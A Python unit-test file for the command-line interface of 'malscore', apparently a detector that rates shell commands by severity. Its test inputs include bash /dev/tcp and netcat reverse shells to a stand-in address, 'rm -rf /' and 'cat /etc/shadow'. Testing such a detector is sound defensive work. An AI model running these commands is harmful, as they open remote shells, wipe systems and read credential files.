"""Command-line interface tests."""

from __future__ import annotations

import contextlib
import io
import json
import os
import tempfile
import unittest
from typing import List, Tuple

import _bootstrap  # noqa: F401
from malscore.cli import main


def run(*argv: str) -> Tuple[int, str]:
    out = io.StringIO()
    with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
        code = main(list(argv))
    return code, out.getvalue()


class CliTest(unittest.TestCase):
    def setUp(self) -> None:
        self.tmpdir = tempfile.mkdtemp(prefix="malscore-cli-")

    def write(self, name: str, text: str) -> str:
        path = os.path.join(self.tmpdir, name)
        with open(path, "w", encoding="utf-8") as handle:
            handle.write(text)
        return path

    def test_text_output(self) -> None:
        code, out = run("--no-color", "--explain", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
        self.assertEqual(code, 0)
        self.assertIn("CRITICAL", out)
        self.assertIn("T1059.004", out)

    def test_json_script(self) -> None:
        path = self.write("s.sh", "#!/bin/sh\nid\nnc -e /bin/sh 1.2.3.4 4444\n")
        code, out = run("-f", path, "--json")
        result = json.loads(out)
        self.assertEqual(code, 0)
        self.assertEqual(len(result["statements"]), 2)
        self.assertEqual(result["statements"][1]["line"], 3)

    def test_fail_on(self) -> None:
        self.assertEqual(run("--fail-on", "high", "rm -rf /")[0], 2)
        self.assertEqual(run("--fail-on", "high", "ls -la")[0], 0)

    def test_batch_jsonl(self) -> None:
        lines: List[str] = [
            json.dumps({"cmdline": "ls -la", "user": "alice"}),
            "not json",
            json.dumps({"command": ["nc", "-e", "/bin/sh", "1.2.3.4", "4444"], "user": "bob",
                        "timestamp": "2026-01-01T00:00:00Z"}),
        ]
        path = self.write("feed.jsonl", "\n".join(lines))
        code, out = run("--batch", path, "--json", "--min-verdict", "high", "--fail-on", "critical")
        records = [json.loads(line) for line in out.splitlines()]
        self.assertEqual(code, 2)
        self.assertEqual([r["user"] for r in records], ["bob"])
        self.assertEqual(records[0]["line"], 3)
        self.assertEqual(records[0]["timestamp"], "2026-01-01T00:00:00Z")

    def test_batch_json_array(self) -> None:
        path = self.write("feed.json", json.dumps([{"cmd": "id"}, {"cmd": "cat /etc/shadow"}]))
        code, out = run("--batch", path, "--json")
        self.assertEqual([json.loads(line)["line"] for line in out.splitlines()], [1, 2])

    def test_redact(self) -> None:
        _code, out = run("--json", "--redact", "mysql --password=hunter2 -h db")
        self.assertNotIn("hunter2", out)

    def tearDown(self) -> None:
        for name in os.listdir(self.tmpdir):
            os.unlink(os.path.join(self.tmpdir, name))
        os.rmdir(self.tmpdir)


if __name__ == "__main__":
    unittest.main()
